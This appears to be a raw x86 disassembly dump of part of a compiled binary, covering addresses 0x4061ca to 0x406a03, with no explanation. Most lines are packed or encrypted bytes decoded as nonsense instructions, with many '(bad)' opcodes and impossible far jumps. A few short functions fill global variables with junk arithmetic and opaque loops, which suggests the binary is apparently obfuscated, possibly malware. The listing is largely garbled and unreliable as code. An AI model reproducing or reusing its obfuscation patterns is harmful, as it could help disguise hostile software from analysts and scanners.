  4061ca:	jg     0x4061ff
  4061cc:	loope  0x40622e
  4061ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061cf:	mov    edx,ebp
  4061d1:	inc    edx
  4061d2:	in     al,dx
  4061d3:	sbb    DWORD PTR [ebx-0x272059be],ecx
  4061d9:	fcomp  QWORD PTR [edx]
  4061db:	(bad)  
  4061dc:	daa    
  4061dd:	fcmovb st,st(3)
  4061df:	and    esi,DWORD PTR [edx-0x3e7357ab]
  4061e5:	popf   
  4061e6:	adc    eax,0xafd1d284
  4061eb:	jbe    0x406261
  4061ed:	dec    ecx
  4061ee:	bound  ebx,QWORD PTR [eax+0x38]
  4061f1:	xchg   ebx,eax
  4061f2:	fwait
  4061f3:	jp     0x406186
  4061f5:	test   DWORD PTR [edx],0x659bb7b3
  4061fb:	jnp    0x40627b
  4061fd:	xor    al,0x97
  4061ff:	mov    ?,WORD PTR [eax]
  406201:	aas    
  406202:	mov    al,0xdf
  406204:	js     0x406199
  406206:	mov    al,ds:0xa2139d8a
  40620b:	add    DWORD PTR [eax-0xb],0xffffff86
  40620f:	fcom   st(0)
  406211:	aas    
  406212:	push   cs
  406213:	sbb    ebp,ebp
  406215:	sbb    esp,0xffffffed
  406218:	cdq    
  406219:	cmp    eax,DWORD PTR [edi+0x3852d2ff]
  40621f:	dec    edi
  406220:	mov    eax,ds:0x5368b0a6
  406225:	sbb    DWORD PTR ds:0xaeed29a9,esi
  40622b:	aas    
  40622c:	xlat   BYTE PTR ds:[ebx]
  40622d:	and    eax,DWORD PTR [ebx]
  40622f:	mul    DWORD PTR [esp+edi*4]
  406232:	or     DWORD PTR [eax+0x46],edi
  406235:	cmp    BYTE PTR [ecx+0x4ab8d83e],bh
  40623b:	fsubr  QWORD PTR [ecx]
  40623d:	sbb    eax,0xfa18cbdc
  406242:	jns    0x40622e
  406244:	js     0x406233
  406246:	(bad)  
  406247:	sbb    ebx,edi
  406249:	(bad)  
  40624a:	pop    ss
  40624b:	hlt    
  40624c:	or     dh,BYTE PTR [ebp+0x3c]
  40624f:	repz mov esp,0xcb6c94ff
  406255:	inc    ebp
  406256:	jns    0x406299
  406258:	xchg   edx,eax
  406259:	mov    ch,0xdd
  40625b:	(bad)  
  40625c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625d:	inc    edx
  40625e:	push   ss
  40625f:	sbb    ah,bh
  406261:	aam    0xc
  406263:	pop    ebx
  406264:	mov    ah,0xf6
  406266:	fimul  WORD PTR [ecx-0x7a]
  406269:	xchg   esp,eax
  40626a:	dec    ecx
  40626b:	fwait
  40626c:	pop    edx
  40626d:	pushf  
  40626e:	(bad)  
  40626f:	push   ecx
  406270:	(bad)  
  406271:	addr16 dec ecx
  406273:	or     BYTE PTR [ebp-0x53],0x18
  406277:	fld    QWORD PTR [ebx+0x768c9b9b]
  40627d:	in     eax,0x28
  40627f:	mov    ds:0x6743c99e,al
  406284:	jge    0x406215
  406286:	push   cs
  406287:	adc    edx,0x3bb4420
  40628d:	out    dx,eax
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	cmp    bl,dl
  406330:	cmp    DWORD PTR [ebp-0x74],0xa770703c
  406337:	jg     0x4063a9
  406339:	jo     0x406317
  40633b:	rep outs dx,DWORD PTR ds:[esi]
  40633d:	mov    ecx,DWORD PTR [eax+0x3f]
  406340:	mov    esi,0x5ccbe863
  406345:	add    DWORD PTR [ecx],ebp
  406347:	mov    bh,0xb8
  406349:	fadd   st(0),st
  40634b:	and    al,0x39
  40634d:	jp     0x4062cf
  40634f:	test   bl,ch
  406351:	fstp   TBYTE PTR [ebx+0x1a625ae8]
  406357:	and    ebx,DWORD PTR [ebx+0x47]
  40635a:	fisttp WORD PTR [esi+0x46]
  40635d:	add    DWORD PTR [ebx+0x6d0ec991],esp
  406363:	dec    esi
  406364:	lock pop eax
  406366:	jns    0x406331
  406368:	daa    
  406369:	inc    edx
  40636a:	xor    al,0x23
  40636c:	test   eax,0x7794091c
  406371:	repz icebp 
  406373:	and    BYTE PTR [ebx-0xe36a1b],cl
  406379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637a:	aam    0x84
  40637c:	mov    ch,ah
  40637e:	or     bh,BYTE PTR fs:[edx]
  406381:	pop    ecx
  406382:	out    dx,eax
  406383:	mov    ebx,0x66ec9e4f
  406388:	int3   
  406389:	or     al,BYTE PTR [esi+0x4894948b]
  40638f:	mov    ebx,?
  406391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406392:	adc    DWORD PTR [eax-0x4f7ba685],0xffffff9e
  406399:	or     DWORD PTR [eax-0x76],edx
  40639c:	fistp  QWORD PTR [eax+0x268a54e0]
  4063a2:	mov    esp,0x3835544d
  4063a7:	or     DWORD PTR [edi],eax
  4063a9:	je     0x40636f
  4063ab:	inc    edi
  4063ac:	jne    0x40636b
  4063ae:	mov    al,ds:0x481c65ac
  4063b3:	leave  
  4063b4:	imul   ebx,edx,0xf0aacf75
  4063ba:	(bad)  
  4063bb:	cmc    
  4063bc:	in     al,0x19
  4063be:	addr16 push es
  4063c0:	jl     0x4063f0
  4063c2:	(bad)  
  4063c3:	lock and ecx,ebp
  4063c6:	add    edi,esi
  4063c8:	pop    ss
  4063c9:	xchg   esi,eax
  4063ca:	dec    ecx
  4063cb:	or     ch,BYTE PTR [ebx+0x26d41ec6]
  4063d1:	mov    ds:0x5389169c,al
  4063d6:	adc    eax,0xf325f626
  4063db:	in     al,dx
  4063dc:	push   edx
  4063dd:	sbb    BYTE PTR [edx-0x1889f1e4],dh
  4063e3:	adc    eax,0x3f0c8614
  4063e8:	leave  
  4063e9:	lods   eax,DWORD PTR ds:[esi]
  4063ea:	cmp    bh,BYTE PTR [esi]
  4063ec:	xor    al,0xf3
  4063ee:	clc    
  4063ef:	inc    edi
  4063f0:	add    ecx,DWORD PTR [edx+0x28dc0e8]
  4063f6:	or     al,0x2e
  4063f8:	jl     0x40640d
  4063fa:	push   esp
  4063fb:	daa    
  4063fc:	add    dh,ah
  4063fe:	mov    ecx,0x1fee955a
  406403:	xchg   ebp,eax
  406404:	les    edx,FWORD PTR [eax+ebp*1+0x71c320ea]
  40640b:	push   ds
  40640c:	dec    ebx
  40640d:	(bad)  
  40640e:	jmp    0x5bc9:0x8cb1a55e
  406415:	sub    BYTE PTR [edi-0x28],ah
  406418:	in     eax,0xdf
  40641a:	test   al,0x55
  40641c:	sbb    eax,0xcc8551f1
  406421:	cdq    
  406422:	inc    ebp
  406423:	cmp    eax,0xa3507b71
  406428:	hlt    
  406429:	retf   
  40642a:	repz adc al,0x71
  40642d:	fstp   st(2)
  40642f:	xchg   ecx,eax
  406430:	(bad)  
  406431:	push   eax
  406432:	mov    ds:0x897aa666,eax
  406437:	stc    
  406438:	dec    eax
  406439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40643a:	fwait
  40643b:	xchg   esi,eax
  40643c:	pop    esi
  40643d:	push   ebp
  40643e:	aam    0x2c
  406440:	and    ebp,esi
  406442:	and    ah,BYTE PTR [edx+0x3e]
  406445:	ins    BYTE PTR es:[edi],dx
  406446:	pusha  
  406447:	ins    BYTE PTR es:[edi],dx
  406448:	frstor [ebx-0x64]
  40644b:	div    BYTE PTR [edi]
  40644d:	or     edx,edi
  40644f:	loopne 0x406471
  406451:	cmp    al,0xc2
  406453:	add    ch,dl
  406455:	sub    DWORD PTR [eax+0x608cdb6f],ecx
  40645b:	nop
  40645c:	test   DWORD PTR ds:0xd9fabf49,edi
  406462:	outs   dx,BYTE PTR ds:[esi]
  406463:	jecxz  0x406472
  406465:	cmp    ch,BYTE PTR [eax+edi*1-0x5ce43033]
  40646c:	inc    ebp
  40646d:	clc    
  40646e:	jmp    0xf2210667
  406473:	xor    eax,0x48690927
  406478:	das    
  406479:	not    BYTE PTR [edi+eax*1+0x5f029a6c]
  406480:	lahf   
  406481:	jne    0x406499
  406483:	or     edi,esp
  406485:	data16 adc BYTE PTR [edx],al
  406488:	and    BYTE PTR [ecx+0x65db1bf],0xeb
  40648f:	or     al,0x80
  406491:	and    dh,BYTE PTR [ebx+0x38b75dc4]
  406497:	imul   esp,DWORD PTR [esi+0x5a2e2ee8],0x6158ec9b
  4064a1:	sub    eax,0x52d188bd
  4064a6:	dec    esi
  4064a7:	sub    eax,0x2ffe4b7e
  4064ac:	daa    
  4064ad:	mov    esi,0xc9f7e673
  4064b2:	ret    
  4064b3:	ins    DWORD PTR es:[edi],dx
  4064b4:	jo     0x40646e
  4064b6:	push   edx
  4064b7:	mov    eax,ds:0xa5eb6872
  4064bc:	hlt    
  4064bd:	sahf   
  4064be:	jns    0x40649e
  4064c0:	scas   al,BYTE PTR es:[edi]
  4064c1:	push   edx
  4064c2:	xor    eax,0x2b4f9c43
  4064c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064c8:	std    
  4064c9:	dec    esp
  4064ca:	int3   
  4064cb:	and    eax,DWORD PTR [eax+0x7ba1e4f5]
  4064d1:	dec    ebx
  4064d2:	push   edi
  4064d3:	sub    ecx,esp
  4064d5:	ins    DWORD PTR es:[edi],dx
  4064d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064d7:	mov    edi,0xaf034a69
  4064dc:	xor    eax,0x4fd163b7
  4064e1:	sbb    DWORD PTR [ebp+0x5e],edi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	popf   
  406567:	or     al,0xd7
  406569:	jg     0x40659e
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	ds ja  0x406507
  406575:	add    ebp,0x72
  406578:	push   edx
  406579:	sub    bl,BYTE PTR ds:0xa8b7b422
  40657f:	ficom  WORD PTR [ebp+eiz*4-0x7b491550]
  406586:	leave  
  406587:	push   es
  406588:	adc    al,0x3a
  40658a:	jge    0x4065a5
  40658c:	(bad)  
  40658d:	dec    DWORD PTR [eax]
  40658f:	(bad)  
  406590:	enter  0x97b1,0x59
  406594:	sahf   
  406595:	scas   al,BYTE PTR es:[edi]
  406596:	sbb    ah,BYTE PTR [esi-0x48]
  406599:	les    edx,FWORD PTR [esi]
  40659b:	xchg   ecx,eax
  40659c:	lods   al,BYTE PTR ds:[esi]
  40659d:	sbb    ebp,DWORD PTR [esi]
  40659f:	nop
  4065a0:	sub    BYTE PTR [ecx+0x69a66e11],dh
  4065a6:	adc    BYTE PTR [ebp-0x41e123eb],ah
  4065ac:	clc    
  4065ad:	and    bh,BYTE PTR [edx+eiz*2]
  4065b0:	xchg   ecx,eax
  4065b1:	cmp    eax,DWORD PTR [esi-0x1a]
  4065b4:	(bad)  
  4065b5:	cmp    eax,0xf82ab8a0
  4065ba:	call   0xa9ea:0xcde8a540
  4065c1:	jns    0x4065ca
  4065c3:	cmp    BYTE PTR [ecx+0x73],cl
  4065c6:	push   ss
  4065c7:	in     al,0xc2
  4065c9:	or     eax,ebx
  4065cb:	fisttp DWORD PTR [edx-0x4791858d]
  4065d1:	push   eax
  4065d2:	test   BYTE PTR [ebp-0x32],cl
  4065d5:	sbb    edi,ebp
  4065d7:	dec    edx
  4065d8:	and    dl,ch
  4065da:	jo     0x4065a9
  4065dc:	(bad)  
  4065dd:	retf   0x2fa5
  4065e0:	(bad)  
  4065e1:	adc    ah,BYTE PTR [edx-0x20]
  4065e4:	ja     0x406582
  4065e6:	jmp    0xa64e:0x5bfe2f01
  4065ed:	dec    esp
  4065ee:	mov    edi,0xd45a7908
  4065f3:	sub    BYTE PTR [ecx],dh
  4065f5:	cmp    eax,0x9c18c582
  4065fa:	sbb    esp,edi
  4065fc:	das    
  4065fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065fe:	and    eax,DWORD PTR [edx]
  406600:	mov    al,0xa0
  406602:	imul   esi,DWORD PTR [ecx],0x63e0ad24
  406608:	push   edx
  406609:	stc    
  40660a:	mov    gs,esi
  40660c:	sub    DWORD PTR [esi-0x9514bb9],0x34
  406613:	xor    eax,0xc1963276
  406618:	stc    
  406619:	mov    ecx,0x635af300
  40661e:	jmp    0x406665
  406620:	mov    dh,0x7a
  406622:	cld    
  406623:	xchg   esp,eax
  406624:	out    0xdd,al
  406626:	icebp  
  406627:	jmp    0x406635
  406629:	mov    ecx,0x84e15e22
  40662e:	jb     0x40668f
  406630:	adc    al,0x84
  406632:	(bad)  
  406633:	aas    
  406634:	(bad)  
  406636:	fmulp  st(7),st
  406638:	push   esi
  406639:	push   esi
  40663a:	xchg   edx,eax
  40663b:	mov    dh,0xc5
  40663d:	outs   dx,DWORD PTR ds:[esi]
  40663e:	xchg   edx,eax
  40663f:	rcl    BYTE PTR [eax+0x54bda9c4],cl
  406645:	outs   dx,BYTE PTR ds:[esi]
  406646:	and    DWORD PTR [ebx+0x7014380e],esp
  40664c:	dec    edi
  40664d:	js     0x4065eb
  40664f:	dec    esp
  406650:	pop    eax
  406651:	cmp    DWORD PTR [eax],0x84a847bb
  406657:	mul    esp
  406659:	and    eax,0x5ee18269
  40665e:	adc    ch,BYTE PTR [ecx+0x5c]
  406661:	pop    edi
  406662:	mov    ebp,eax
  406664:	sub    al,0x4f
  406666:	aaa    
  406667:	jmp    0xb12c:0x73496fba
  40666e:	(bad)  
  40666f:	aam    0x7c
  406671:	fld    DWORD PTR [esi+0x2b]
  406674:	dec    esp
  406675:	cld    
  406676:	rol    ebp,0x52
  406679:	outs   dx,DWORD PTR ds:[esi]
  40667a:	jne    0x4066b5
  40667c:	jno    0x4066c1
  40667e:	shr    DWORD PTR [edi],cl
  406680:	jns    0x4066d5
  406682:	test   eax,0x4751c4b9
  406687:	fwait
  406688:	adc    BYTE PTR ds:[esi*4-0x422ac7db],ch
  406690:	iret   
  406691:	add    BYTE PTR [ebx+esi*1],ah
  406694:	enterw 0x9823,0xce
  406699:	adc    al,0x99
  40669b:	lods   eax,DWORD PTR ds:[esi]
  40669c:	out    0x1,al
  40669e:	arpl   WORD PTR [edi],bx
  4066a0:	in     eax,0x60
  4066a2:	jno    0x40668c
  4066a4:	pop    edi
  4066a5:	(bad)  
  4066a6:	in     eax,dx
  4066a7:	mov    eax,0x5085407
  4066ac:	and    al,BYTE PTR [esi]
  4066ae:	mov    al,0xb9
  4066b0:	or     al,0x74
  4066b2:	mov    ds:0x7d4759c6,eax
  4066b7:	icebp  
  4066b8:	loopne 0x406714
  4066ba:	scas   al,BYTE PTR es:[edi]
  4066bb:	sub    DWORD PTR [bp+di],ecx
  4066be:	pop    edx
  4066bf:	not    ebx
  4066c1:	lods   eax,DWORD PTR ds:[esi]
  4066c2:	bound  edx,QWORD PTR [ebx]
  4066c4:	xchg   edi,eax
  4066c5:	jnp    0x40664a
  4066c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066c8:	dec    esp
  4066c9:	call   0x61b1:0x4c352d66
  4066d0:	das    
  4066d1:	jl     0x406693
  4066d3:	push   esi
  4066d4:	jbe    0x4066ca
  4066d6:	mov    ebx,0xbf85cf4d
  4066db:	mov    WORD PTR [esi-0x6faa1316],?
  4066e1:	add    ebp,ebp
  4066e3:	push   esi
  4066e4:	mov    esp,0xec7e7a93
  4066e9:	push   edi
  4066ea:	sub    DWORD PTR [edi+0x2994b6c],0xfffffff5
  4066f1:	ret    
  4066f2:	add    al,0xfe
  4066f4:	mov    BYTE PTR [ecx+0x47cfb63b],0xc3
  4066fb:	xchg   ecx,eax
  4066fc:	loopne 0x40675b
  4066fe:	aam    0x49
  406700:	push   0x61
  406702:	ins    DWORD PTR es:[edi],dx
  406703:	cli    
  406704:	xchg   BYTE PTR [ecx],cl
  406706:	mov    ebx,0x2991499a
  40670c:	fisttp QWORD PTR [eax]
  40670e:	jl     0x4066f1
  406710:	mov    bh,0x1e
  406712:	out    dx,al
  406713:	fst    QWORD PTR [ebx]
  406715:	sbb    al,0x19
  406717:	xor    al,ch
  406719:	int3   
  40671a:	mov    ds,edi
  40671c:	icebp  
  40671d:	cmp    al,0x85
  40671f:	pop    ds
  406720:	mov    ebx,0xf626fcc5
  406725:	cmc    
  406726:	sub    eax,0x3081ab02
  40672b:	dec    ebx
  40672c:	cld    
  40672d:	add    BYTE PTR ds:0x583afd2a,ch
  406733:	fs jae 0x40673c
  406736:	bound  esp,QWORD PTR [edi+ebp*1]
  406739:	jg     0x40679d
  40673b:	leave  
  40673c:	push   cs
  40673d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40673e:	mov    bl,0xd5
  406740:	pop    ecx
  406741:	mov    dl,0x27
  406743:	or     ebx,DWORD PTR [ebx+0x7a]
  406746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406747:	pop    ds
  406748:	mov    ds:0x2d627d0d,eax
  40674d:	mov    cl,0xd3
  40674f:	retf   
  406750:	jmp    0x1c4b2a86
  406755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406756:	mov    gs,WORD PTR [eax]
  406758:	cmovae ecx,ecx
  40675b:	pop    ebx
  40675c:	cmp    eax,0xffcf974d
  406761:	sbb    BYTE PTR [ecx],ch
  406763:	sub    dl,dh
  406765:	xchg   ecx,eax
  406766:	es adc ebp,ecx
  406769:	pop    ecx
  40676a:	push   ebp
  40676b:	or     ebx,edi
  40676d:	mov    ds:0xcd50789,al
  406772:	cs out 0x8,al
  406775:	jne    0x40675c
  406777:	outs   dx,DWORD PTR ds:[esi]
  406778:	cmp    al,BYTE PTR [edi]
  40677a:	sbb    ah,ah
  40677c:	pop    ds
  40677d:	call   0x20c90d30
  406782:	jg     0x4067f3
  406784:	jl     0x406739
  406786:	sub    al,0x49
  406788:	xchg   ecx,eax
  406789:	sbb    eax,DWORD PTR [ecx-0x23d078fa]
  40678f:	fsub   QWORD PTR [bp+di]
  406792:	sbb    cl,BYTE PTR [edi+0x41]
  406795:	mov    al,ds:0x378bafee
  40679a:	ins    DWORD PTR es:[edi],dx
  40679b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40679c:	pop    esi
  40679d:	leave  
  40679e:	jns    0x40681a
  4067a0:	jmp    FWORD PTR [ebp+0x8]
  4067a3:	call   0xa87b:0xd0be2bec
  4067aa:	push   ecx
  4067ab:	mov    ecx,0xab63b0a0
  4067b0:	cmp    ah,BYTE PTR [ecx-0xd19c007]
  4067b6:	xor    edi,ebx
  4067b8:	xor    BYTE PTR [eax+0x4d],ah
  4067bb:	add    eax,0x6fa666a8
  4067c0:	and    cl,bl
  4067c2:	dec    edi
  4067c3:	pusha  
  4067c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c5:	out    0x1e,eax
  4067c7:	stos   BYTE PTR es:[edi],al
  4067c8:	xor    BYTE PTR [eax+eax*4+0x4dd239ff],ch
  4067cf:	mov    esp,ds
  4067d1:	jl     0x4067a3
  4067d3:	outs   dx,DWORD PTR ds:[esi]
  4067d4:	fiadd  WORD PTR [ebp+0xf]
  4067d7:	arpl   WORD PTR [edx+0x63],dx
  4067da:	fbld   TBYTE PTR [eax+0x26240a75]
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	sub    dl,BYTE PTR [ebp+0x38a58334]
  40684c:	jo     0x4068be
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	loope  0x406894
  406854:	mov    WORD PTR [edi-0x4713ed42],?
  40685a:	aaa    
  40685b:	ror    BYTE PTR [eax+ebp*1],0x35
  40685f:	adc    bl,dh
  406861:	repnz sub esi,esi
  406864:	mov    al,ds:0xcbf312bb
  406869:	sar    BYTE PTR [edx-0x55f79e14],cl
  40686f:	retf   0x3b18
  406872:	addr16 or al,0x56
  406875:	call   0x6334:0xccb9f5d0
  40687c:	mov    ch,0xfb
  40687e:	mov    dl,0x3c
  406880:	or     eax,esi
  406882:	jg     0x4068c8
  406884:	call   0xe27838b5
  406889:	add    BYTE PTR [edx+0x135f08ef],al
  40688f:	ret    
  406890:	jae    0x406909
  406892:	je     0x406850
  406894:	inc    ecx
  406895:	fs and edi,0x2e8ef85f
  40689c:	pusha  
  40689d:	cmp    ebp,DWORD PTR [ecx-0x30f2ac3d]
  4068a3:	std    
  4068a4:	addr16 mov edx,0x7c4113e4
  4068aa:	lahf   
  4068ab:	dec    edi
  4068ac:	data16 lahf 
  4068ae:	and    al,0x55
  4068b0:	cdq    
  4068b1:	push   eax
  4068b2:	lds    edi,FWORD PTR [ecx]
  4068b4:	sahf   
  4068b5:	add    dl,BYTE PTR [ebx+0x38386335]
  4068bb:	js     0x40689e
  4068bd:	mov    ch,0x5b
  4068bf:	push   ecx
  4068c0:	or     ecx,0x10d71cfa
  4068c6:	dec    eax
  4068c7:	mov    DWORD PTR [edi+0x51eec10b],edx
  4068cd:	xor    al,0xbe
  4068cf:	mov    dl,0xa0
  4068d1:	sahf   
  4068d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068d3:	lods   al,BYTE PTR ds:[esi]
  4068d4:	imul   ebp,esp,0x64f428d5
  4068da:	dec    ecx
  4068db:	adc    eax,0x487e3975
  4068e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e1:	outs   dx,BYTE PTR ds:[esi]
  4068e2:	lods   al,BYTE PTR ds:[esi]
  4068e3:	js     0x4068ca
  4068e5:	rol    DWORD PTR [edi+edx*4+0x37],cl
  4068e9:	(bad)  
  4068ea:	mov    ch,0xbf
  4068ec:	not    DWORD PTR [ebx]
  4068ee:	out    0x68,eax
  4068f0:	add    ah,BYTE PTR [ebp+0x5]
  4068f3:	leave  
  4068f4:	mov    edx,0x66e9b7f
  4068f9:	dec    edi
  4068fa:	(bad)  
  4068fc:	rol    BYTE PTR [ebx+0x4b988f9],0xb1
  406903:	adc    al,0x6c
  406905:	and    esi,esi
  406907:	adc    eax,0xf12812e9
  40690c:	push   edi
  40690d:	out    dx,eax
  40690e:	nop
  40690f:	sub    BYTE PTR [ebp+edi*8-0x55987f1c],ah
  406916:	add    eax,0xa503c8ad
  40691b:	jo     0x406924
  40691d:	or     eax,0x363a9e85
  406922:	sbb    BYTE PTR [ebx+0x68],bh
  406925:	into   
  406926:	jp     0x4068f8
  406928:	test   eax,0x9c394fbb
  40692d:	nop
  40692e:	call   0x80a2a666
  406933:	std    
  406934:	idiv   DWORD PTR [ecx]
  406936:	retf   
  406937:	mov    ?,ecx
  406939:	mov    al,ds:0x9733ca86
  40693e:	push   esp
  40693f:	xchg   BYTE PTR [ebx-0xc],dl
  406942:	int    0x3d
  406944:	xchg   edi,eax
  406945:	ret    0x4e70
  406948:	push   edi
  406949:	mov    esi,DWORD PTR [eax+0x3a9b2d8c]
  40694f:	mov    ds:0xffbe51a,eax
  406954:	adc    DWORD PTR [ebx-0x6b1e6553],eax
  40695a:	inc    ebx
  40695b:	xor    BYTE PTR [ebp+0x42],0xb5
  40695f:	and    BYTE PTR [ebx+0x4d],dh
  406962:	pop    esi
  406963:	js     0x4068ed
  406965:	imul   eax,edx,0xffffff8f
  406968:	sbb    DWORD PTR [edi-0x34],esi
  40696b:	out    dx,eax
  40696c:	fadd   QWORD PTR [edi+0x79ebd48a]
  406972:	lods   eax,DWORD PTR ds:[esi]
  406973:	jb     0x40699a
  406975:	or     dl,BYTE PTR [ecx+0x31]
  406978:	test   DWORD PTR [esi+0x33],ecx
  40697b:	gs test edi,0xb0a4a419
  406982:	add    ch,BYTE PTR [ebx]
  406984:	call   0x3d1f:0xe9ccd3a8
  40698b:	cmp    al,0x74
  40698d:	iret   
  40698e:	push   es
  40698f:	aaa    
  406990:	and    edx,DWORD PTR [edx+0x32]
  406993:	dec    ebx
  406994:	test   al,0x63
  406996:	repnz bound edi,QWORD PTR [eax+0x8666644]
  40699d:	add    eax,0x60d8196b
  4069a2:	int3   
  4069a3:	inc    esp
  4069a4:	retf   
  4069a5:	xor    DWORD PTR [ecx-0x5ff553fd],ecx
  4069ab:	sbb    al,0xd7
  4069ad:	xor    eax,0xc8cf824d
  4069b2:	and    eax,0x6d21b19
  4069b7:	inc    esp
  4069b8:	xchg   edi,eax
  4069b9:	in     eax,dx
  4069ba:	ins    BYTE PTR es:[edi],dx
  4069bb:	int3   
  4069bc:	mov    DWORD PTR [ebx+0x33],esi
  4069bf:	inc    ebp
  4069c0:	cmp    al,0x8e
  4069c2:	inc    esi
  4069c3:	int3   
  4069c4:	or     ebx,esi
  4069c6:	add    DWORD PTR [eax],0xffffffa6
  4069c9:	je     0x406969
  4069cb:	mov    ebp,fs
  4069cd:	mov    dh,0x83
  4069cf:	pop    ss
  4069d0:	out    0x53,eax
  4069d2:	aad    0xf4
  4069d4:	sub    eax,0x9c62afb2
  4069d9:	fsub   st,st(2)
  4069db:	mov    cl,0x1
  4069dd:	data16 mov al,0x52
  4069e0:	xlat   BYTE PTR ds:[ebx]
  4069e1:	sub    bl,al
  4069e3:	cvtpi2ps xmm6,mm3
  4069e6:	ror    BYTE PTR [ebx-0x5eba6dc6],1
  4069ec:	sbb    DWORD PTR [esi],ecx
  4069ee:	jmp    0x406a0e
  4069f0:	ss cmp al,0xc
  4069f3:	retf   
  4069f4:	adc    DWORD PTR [edx-0x181ad03b],edi
  4069fa:	cmp    ebx,ebp
  4069fc:	pop    ss
  4069fd:	popa   
  4069fe:	jne    0x4069f0
  406a00:	ret    0x5d36
  406a03:	xor    ch,BYTE PTR [esi-0x29]
